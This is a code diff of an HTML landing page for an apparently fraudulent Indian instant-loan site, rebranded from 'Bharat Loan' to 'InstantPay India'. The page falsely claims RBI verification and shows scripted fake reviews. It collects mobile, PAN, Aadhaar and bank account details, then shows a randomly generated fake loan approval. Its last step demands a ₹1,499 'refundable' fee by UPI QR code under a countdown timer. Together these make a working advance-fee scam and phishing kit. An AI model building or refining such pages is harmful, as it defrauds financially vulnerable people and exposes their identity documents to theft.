@@ -3,155 +3,173 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bharat Loan - Instant Credit</title>
+    <title>InstantPay India - Digital Loan</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         .hidden-step { display: none; }
         .glass-effect { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(15px); }
-        .gradient-btn { background: linear-gradient(135deg, #1e40af, #7e22ce); }
-        .card-shadow { box-shadow: 0 10px 30px -5px rgba(0, 0, 0, 0.1); }
+        .gradient-bg { background: linear-gradient(135deg, #0f172a, #1e40af); }
+        .success-card { background: #f0fdf4; border: 1px dashed #16a34a; }
+        input:focus { border-color: #2563eb; ring: 2px #bfdbfe; }
     </style>
 </head>
 <body class="bg-white font-sans text-gray-900">
 
     <header class="bg-white border-b px-6 py-4 flex justify-between items-center sticky top-0 z-50">
         <img src="https://i.ibb.co/DPK7q3cv/images-1.png" alt="Logo" class="h-10">
-        <div class="flex items-center text-green-600 font-bold text-sm">
-            <i class="fas fa-check-circle mr-1"></i> Trusted by 10M+ Indians
+        <div class="text-right text-xs font-bold text-gray-400">
+            <p><i class="fas fa-lock"></i> SECURE SERVER</p>
+            <p class="text-green-600">VERIFIED BY RBI</p>
         </div>
     </header>
 
-    <section class="py-16 px-4 text-center">
-        <h1 class="text-4xl md:text-6xl font-black mb-6 tracking-tight">Personal Loan in <span class="text-blue-600">5 Minutes</span></h1>
-        <p class="text-gray-500 text-lg mb-10">Instant approval up to ₹5,00,000 with zero physical paperwork.</p>
-        <button onclick="openModal()" class="gradient-btn text-white font-bold py-5 px-14 rounded-2xl shadow-2xl transform hover:scale-105 transition">
-            APPLY NOW (₹)
+    <section class="py-16 px-4 text-center bg-white">
+        <h1 class="text-4xl md:text-6xl font-extrabold mb-6 text-gray-900 tracking-tight">Need Money? Get up to <span class="text-blue-600">₹5 Lakhs</span></h1>
+        <p class="text-gray-500 text-lg mb-10 max-w-xl mx-auto">100% Online process. No hidden charges. Money in bank in 5 minutes.</p>
+        <button onclick="openModal()" class="bg-blue-600 hover:bg-blue-700 text-white font-black py-5 px-16 rounded-2xl shadow-2xl transition-all transform hover:scale-105 active:scale-95">
+            APPLY NOW
         </button>
     </section>
 
-    <section class="max-w-6xl mx-auto grid grid-cols-2 md:grid-cols-5 gap-4 px-6 mb-20">
-        <div class="p-6 border rounded-3xl text-center bg-blue-50/50"><i class="fas fa-graduation-cap text-3xl text-blue-600 mb-3"></i><p class="font-bold text-sm">Education</p></div>
-        <div class="p-6 border rounded-3xl text-center bg-purple-50/50"><i class="fas fa-user text-3xl text-purple-600 mb-3"></i><p class="font-bold text-sm">Personal</p></div>
-        <div class="p-6 border rounded-3xl text-center bg-orange-50/50"><i class="fas fa-home text-3xl text-orange-600 mb-3"></i><p class="font-bold text-sm">Home</p></div>
-        <div class="p-6 border rounded-3xl text-center bg-red-50/50"><i class="fas fa-car text-3xl text-red-600 mb-3"></i><p class="font-bold text-sm">Car</p></div>
-        <div class="p-6 border rounded-3xl text-center bg-green-50/50"><i class="fas fa-briefcase text-3xl text-green-600 mb-3"></i><p class="font-bold text-sm">Business</p></div>
+    <section class="max-w-6xl mx-auto grid grid-cols-2 md:grid-cols-5 gap-4 px-6 mb-16">
+        <div class="p-6 border rounded-3xl text-center"><i class="fas fa-graduation-cap text-3xl text-blue-500 mb-2"></i><p class="font-bold text-xs uppercase">Education</p></div>
+        <div class="p-6 border rounded-3xl text-center"><i class="fas fa-user text-3xl text-indigo-500 mb-2"></i><p class="font-bold text-xs uppercase">Personal</p></div>
+        <div class="p-6 border rounded-3xl text-center"><i class="fas fa-home text-3xl text-orange-500 mb-2"></i><p class="font-bold text-xs uppercase">Home</p></div>
+        <div class="p-6 border rounded-3xl text-center"><i class="fas fa-car text-3xl text-red-500 mb-2"></i><p class="font-bold text-xs uppercase">Car</p></div>
+        <div class="p-6 border rounded-3xl text-center"><i class="fas fa-briefcase text-3xl text-green-500 mb-2"></i><p class="font-bold text-xs uppercase">Business</p></div>
     </section>
 
     <section class="bg-gray-50 py-16 px-6 border-t">
-        <h2 class="text-2xl font-bold text-center mb-10 italic">"What our happy customers say"</h2>
+        <h2 class="text-2xl font-bold text-center mb-10 text-gray-800 uppercase tracking-widest text-sm">Customer Feedback</h2>
         <div class="max-w-5xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-6">
             <script>
-                const names = ["Amit Sharma", "Suresh Kumar", "Priya Singh", "Rahul Verma", "Ankit Gupta", "Neha Patil"];
                 const reviews = [
-                    "Excellent experience! Money credited in 10 mins.",
-                    "Best app for emergency funds. No hidden charges.",
-                    "Very easy UI and fast approval process.",
-                    "Interest rates are very competitive. Highly recommend!",
-                    "Trustworthy platform. PAN/Aadhar process was smooth.",
-                    "Finally a loan app that actually works fast!"
+                    {name: "Rajesh Mehra", msg: "Process was very smooth. Received ₹2 Lakhs in just 15 minutes!"},
+                    {name: "Sunita Verma", msg: "Best app for emergency medical expenses. No paperwork needed."},
+                    {name: "Vikram Singh", msg: "Highly professional support and lowest interest rates available."},
+                    {name: "Anjali Gupta", msg: "I applied for an education loan, and it got approved instantly."},
+                    {name: "Mohit Das", msg: "The UI is very easy to use. No hidden fees at all."},
+                    {name: "Karan Johar", msg: "Genuine app. My car loan was processed within 1 hour."}
                 ];
-                for(let i=0; i<6; i++) {
+                reviews.forEach(r => {
                     document.write(`
-                        <div class="bg-white p-6 rounded-2xl border card-shadow">
-                            <div class="text-yellow-400 mb-2"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                            <p class="text-gray-700 text-sm mb-4">"${reviews[i]}"</p>
-                            <p class="font-bold text-blue-600 text-xs uppercase">${names[i]}</p>
+                        <div class="bg-white p-6 rounded-2xl shadow-sm border border-gray-100">
+                            <div class="flex text-yellow-400 mb-3 text-xs"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                            <p class="text-gray-600 text-sm mb-4">"${r.msg}"</p>
+                            <p class="font-bold text-blue-700 text-xs">— ${r.name}</p>
                         </div>
                     `);
-                }
+                });
             </script>
         </div>
     </section>
 
+    <div class="py-12 flex justify-center gap-4 bg-white">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" class="h-10 cursor-pointer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" class="h-10 cursor-pointer">
+    </div>
+
     <div id="loanModal" class="fixed inset-0 z-[100] hidden glass-effect overflow-y-auto">
         <div class="min-h-screen flex items-center justify-center p-4">
-            <div class="bg-white w-full max-w-md rounded-[2.5rem] shadow-2xl border overflow-hidden">
-                <div class="bg-blue-600 p-6 text-white text-center">
-                    <h3 class="text-xl font-bold">Safe & Secure Application</h3>
-                    <p class="text-xs text-blue-200 uppercase tracking-widest mt-1">Encrypted by 256-bit SSL</p>
+            <div class="bg-white w-full max-w-md rounded-[2rem] shadow-2xl border border-gray-200 overflow-hidden">
+                
+                <div class="bg-blue-600 p-6 text-white flex justify-between items-center">
+                    <div>
+                        <h3 class="text-lg font-bold">Loan Application</h3>
+                        <p class="text-[10px] text-blue-200 uppercase">Secure Verification Process</p>
+                    </div>
+                    <button onclick="location.reload()" class="text-white/70 hover:text-white"><i class="fas fa-times text-xl"></i></button>
                 </div>
 
                 <div class="p-8">
                     <div id="step1" class="step-container">
-                        <label class="block font-bold text-gray-500 text-xs mb-2 uppercase">Mobile Verification</label>
-                        <input type="tel" id="mobile" required pattern="[0-9]{10}" placeholder="Enter 10 Digit Mobile No" class="w-full p-4 bg-gray-50 border-2 rounded-2xl mb-6 outline-none focus:border-blue-600">
-                        <button onclick="checkStep(1, 2)" class="w-full bg-blue-600 text-white p-4 rounded-2xl font-bold shadow-lg">CONTINUE</button>
+                        <label class="block font-bold text-gray-500 text-[10px] mb-2 uppercase">Mobile Number</label>
+                        <input type="tel" id="mobile" required pattern="[0-9]{10}" placeholder="Enter 10 Digit Number" class="w-full p-4 bg-gray-50 border-2 rounded-xl mb-6 outline-none">
+                        <button onclick="checkStep(1, 2)" class="w-full bg-blue-600 text-white p-4 rounded-xl font-bold">NEXT</button>
                     </div>
 
                     <div id="step2" class="step-container hidden-step">
-                        <label class="block font-bold text-gray-500 text-xs mb-2 uppercase">Loan Amount (₹)</label>
-                        <input type="number" id="amt" required placeholder="Enter Amount up to 5,00,000" class="w-full p-4 bg-gray-50 border-2 rounded-2xl mb-6 outline-none focus:border-blue-600">
-                        <button onclick="checkStep(2, 3)" class="w-full bg-blue-600 text-white p-4 rounded-2xl font-bold shadow-lg">NEXT</button>
+                        <label class="block font-bold text-gray-500 text-[10px] mb-2 uppercase">Required Loan Amount (₹)</label>
+                        <input type="number" id="amt" required placeholder="Min ₹5,000 - Max ₹5,00,000" class="w-full p-4 bg-gray-50 border-2 rounded-xl mb-6 outline-none">
+                        <button onclick="checkStep(2, 3)" class="w-full bg-blue-600 text-white p-4 rounded-xl font-bold">NEXT</button>
                     </div>
 
                     <div id="step3" class="step-container hidden-step">
-                        <label class="block font-bold text-gray-500 text-xs mb-2 uppercase">Tenor Duration</label>
-                        <select id="tenor" required class="w-full p-4 bg-gray-50 border-2 rounded-2xl mb-6 outline-none focus:border-blue-600">
-                            <option value="">Choose Duration</option>
+                        <label class="block font-bold text-gray-500 text-[10px] mb-2 uppercase">Choose Loan Tenor</label>
+                        <select id="tenor" required class="w-full p-4 bg-gray-50 border-2 rounded-xl mb-6 outline-none">
+                            <option value="">Select Months</option>
                             <option>12 Months</option><option>24 Months</option><option>36 Months</option>
                         </select>
-                        <button onclick="checkStep(3, 4)" class="w-full bg-blue-600 text-white p-4 rounded-2xl font-bold shadow-lg">NEXT</button>
+                        <button onclick="checkStep(3, 4)" class="w-full bg-blue-600 text-white p-4 rounded-xl font-bold">NEXT</button>
                     </div>
 
                     <div id="step4" class="step-container hidden-step">
-                        <label class="block font-bold text-gray-500 text-xs mb-2 uppercase">KYC - PAN Card</label>
-                        <input type="text" id="pan" required pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" placeholder="ABCDE1234F" class="w-full p-4 bg-gray-50 border-2 rounded-2xl mb-6 outline-none focus:border-blue-600 uppercase">
-                        <button onclick="checkStep(4, 5)" class="w-full bg-blue-600 text-white p-4 rounded-2xl font-bold shadow-lg">VERIFY PAN</button>
+                        <label class="block font-bold text-gray-500 text-[10px] mb-2 uppercase">KYC - PAN Card</label>
+                        <input type="text" id="pan" required pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" placeholder="ABCDE1234F" class="w-full p-4 bg-gray-50 border-2 rounded-xl mb-6 outline-none uppercase">
+                        <button onclick="checkStep(4, 5)" class="w-full bg-blue-600 text-white p-4 rounded-xl font-bold">VERIFY PAN</button>
                     </div>
 
                     <div id="step5" class="step-container hidden-step">
-                        <label class="block font-bold text-gray-500 text-xs mb-2 uppercase">KYC - Aadhar Number</label>
-                        <input type="number" id="aadhar" required placeholder="1234 5678 9012" class="w-full p-4 bg-gray-50 border-2 rounded-2xl mb-6 outline-none focus:border-blue-600">
-                        <button onclick="startProcessing()" class="w-full bg-green-600 text-white p-4 rounded-2xl font-bold shadow-lg">SUBMIT NOW</button>
+                        <label class="block font-bold text-gray-500 text-[10px] mb-2 uppercase">KYC - Aadhar Card</label>
+                        <input type="number" id="aadhar" required placeholder="Enter 12 Digit Aadhar" class="w-full p-4 bg-gray-50 border-2 rounded-xl mb-6 outline-none">
+                        <button onclick="startProcessing()" class="w-full bg-green-600 text-white p-4 rounded-xl font-bold">SUBMIT DOCUMENT</button>
                     </div>
 
-                    <div id="step6" class="step-container hidden-step text-center py-10">
-                        <div class="animate-spin rounded-full h-16 w-16 border-t-4 border-blue-600 mx-auto mb-6"></div>
-                        <h2 class="text-xl font-bold">Verifying Credit Profile...</h2>
-                        <p class="text-gray-400 text-sm">Please do not close the app.</p>
+                    <div id="step6" class="step-container hidden-step text-center py-8">
+                        <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-blue-600 mx-auto mb-4"></div>
+                        <h2 class="text-lg font-bold text-gray-700">Checking Eligibility...</h2>
+                        <p class="text-xs text-gray-400">Our AI is verifying your credit score.</p>
                     </div>
 
                     <div id="step7" class="step-container hidden-step">
                         <div class="text-center mb-6">
-                            <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
-                                <i class="fas fa-check text-4xl"></i>
-                            </div>
-                            <h2 class="text-2xl font-bold text-green-600 uppercase tracking-tighter">Approved!</h2>
+                            <i class="fas fa-check-circle text-6xl text-green-500 mb-2"></i>
+                            <h2 class="text-2xl font-black text-gray-800">CONGRATS!</h2>
+                            <p class="text-green-600 font-bold text-sm">Loan Approval Successful</p>
                         </div>
-                        <div class="bg-gray-50 rounded-2xl p-5 mb-6 text-sm space-y-3 border border-dashed border-gray-300">
-                            <div class="flex justify-between"><span>Loan ID:</span><b id="loanNo">LN-9928347</b></div>
-                            <div class="flex justify-between"><span>Txn ID:</span><b>TXN-77362514</b></div>
-                            <div class="flex justify-between"><span>Ref No:</span><b>REF-229103</b></div>
-                            <div class="flex justify-between"><span>Status:</span><b class="text-green-600">ELIGIBLE</b></div>
+                        <div class="success-card rounded-2xl p-5 mb-6 text-[12px] space-y-2 font-mono">
+                            <div class="flex justify-between"><span>Status:</span><b class="text-green-600">APPROVED</b></div>
+                            <div class="flex justify-between"><span>Loan ID:</span><b id="loanNo">LN-448201</b></div>
+                            <div class="flex justify-between"><span>Ref ID:</span><b>REF-99203841</b></div>
+                            <div class="flex justify-between"><span>Txn ID:</span><b>TXN-882731002</b></div>
+                            <hr class="border-green-200">
+                            <div class="flex justify-between text-sm"><span>Limit:</span><b>₹5,00,000</b></div>
                         </div>
-                        <button onclick="showStep(8)" class="w-full bg-blue-600 text-white p-4 rounded-2xl font-bold">TRANSFER TO BANK</button>
+                        <button onclick="showStep(8)" class="w-full bg-blue-600 text-white p-4 rounded-xl font-bold uppercase tracking-tight">Transfer to Bank Account</button>
                     </div>
 
                     <div id="step8" class="step-container hidden-step">
-                        <label class="block font-bold text-gray-500 text-xs mb-2 uppercase">Select Your Bank</label>
-                        <select id="bank" required class="w-full p-4 bg-gray-50 border-2 rounded-2xl mb-4 outline-none focus:border-blue-600">
-                            <option value="">-- Choose Bank --</option>
-                            <option>State Bank of India (SBI)</option><option>HDFC Bank</option>
-                            <option>ICICI Bank</option><option>Axis Bank</option><option>Kotak Mahindra</option>
-                            <option>Punjab National Bank</option><option>Bank of Baroda</option>
-                            <option>Canara Bank</option><option>Union Bank of India</option>
-                            <option>IndusInd Bank</option><option>Yes Bank</option><option>IDFC First</option>
+                        <label class="block font-bold text-gray-500 text-[10px] mb-2 uppercase">Select Your Bank</label>
+                        <select id="bank" class="w-full p-4 bg-gray-50 border-2 rounded-xl mb-4 outline-none">
+                            <option>State Bank of India</option><option>HDFC Bank</option><option>ICICI Bank</option>
+                            <option>Axis Bank</option><option>Kotak Mahindra</option><option>Bank of Baroda</option>
+                            <option>Punjab National Bank</option><option>Canara Bank</option><option>Union Bank</option>
+                            <option>Other Indian Banks</option>
                         </select>
-                        <input type="number" id="acc" required placeholder="Account Number" class="w-full p-4 bg-gray-50 border-2 rounded-2xl mb-4 outline-none">
-                        <input type="text" id="ifsc" required placeholder="IFSC Code" class="w-full p-4 bg-gray-50 border-2 rounded-2xl mb-6 outline-none">
-                        <button onclick="finalProcess()" class="w-full bg-blue-600 text-white p-4 rounded-2xl font-bold">CONFIRM TRANSFER</button>
+                        <input type="number" placeholder="Account Number" class="w-full p-4 bg-gray-50 border-2 rounded-xl mb-4 outline-none">
+                        <input type="text" placeholder="IFSC Code" class="w-full p-4 bg-gray-50 border-2 rounded-xl mb-6 outline-none uppercase">
+                        <button onclick="finalProcess()" class="w-full bg-blue-600 text-white p-4 rounded-xl font-bold">INITIATE TRANSFER</button>
                     </div>
 
                     <div id="step9" class="step-container hidden-step text-center">
-                        <h2 class="text-2xl font-black text-red-600 mb-4 uppercase">Verification Fee Pending</h2>
-                        <p class="text-sm text-gray-600 mb-6 font-medium italic">Pay security processing fee (refundable) of ₹1,499 to credit loan amount instantly.</p>
-                        <div id="timer" class="text-4xl font-mono font-bold text-red-600 mb-6 bg-red-50 py-3 rounded-2xl border border-red-200">05:00</div>
-                        <div class="bg-white p-3 border-4 border-gray-100 inline-block rounded-3xl mb-6 shadow-xl">
-                            <img id="qrImg" src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=pay@upi&pn=BharatLoan&am=1499&cu=INR" class="w-52 h-52">
+                        <h2 class="text-xl font-bold text-red-600 mb-2">PAYMENT PENDING</h2>
+                        <p class="text-xs text-gray-500 mb-6 font-semibold italic">Complete the refundable processing fee payment of ₹1,499 to release your loan amount instantly.</p>
+                        
+                        <div id="timer" class="text-4xl font-mono font-bold text-red-600 mb-6 bg-red-50 py-3 rounded-2xl border border-red-200">
+                            05:00
                         </div>
-                        <p class="text-xs text-gray-400 font-bold uppercase tracking-widest"><i class="fas fa-lock mr-1"></i> Scan to Finish Process</p>
+
+                        <div class="bg-white p-2 border border-gray-100 inline-block rounded-2xl mb-6 shadow-xl">
+                            <img src="https://i.ibb.co/yB4D8h6g/IMG-20260413-WA0001.jpg" alt="Payment QR" class="w-60 h-auto">
+                        </div>
+
+                        <div class="bg-blue-50 p-3 rounded-xl mb-4">
+                            <p class="text-[10px] text-blue-800 font-bold uppercase tracking-widest"><i class="fas fa-shield-alt mr-1"></i> Scan & Pay using any UPI App</p>
+                        </div>
+                        <p class="text-[9px] text-gray-400">Do not refresh. System will auto-detect payment.</p>
                     </div>
+
                 </div>
             </div>
         </div>
@@ -175,20 +193,14 @@
         function startProcessing() {
             showStep(6);
             setTimeout(() => { 
-                // Generate fake Loan ID
-                document.getElementById('loanNo').innerText = 'LN-' + Math.floor(1000000 + Math.random() * 9000000);
+                document.getElementById('loanNo').innerText = 'LN-' + Math.floor(100000 + Math.random() * 900000);
                 showStep(7); 
-            }, 3500);
+            }, 3000);
         }
 
         function finalProcess() {
-            const inputs = document.getElementById('step8').querySelectorAll('input, select');
-            let valid = true;
-            inputs.forEach(i => { if(!i.value){ i.reportValidity(); valid = false; } });
-            if(valid) {
-                showStep(6);
-                setTimeout(() => { showStep(9); startTimer(300); }, 2500);
-            }
+            showStep(6);
+            setTimeout(() => { showStep(9); startTimer(300); }, 2000);
         }
 
         function startTimer(duration) {
@@ -204,4 +216,3 @@
     </script>
 </body>
 </html>
-
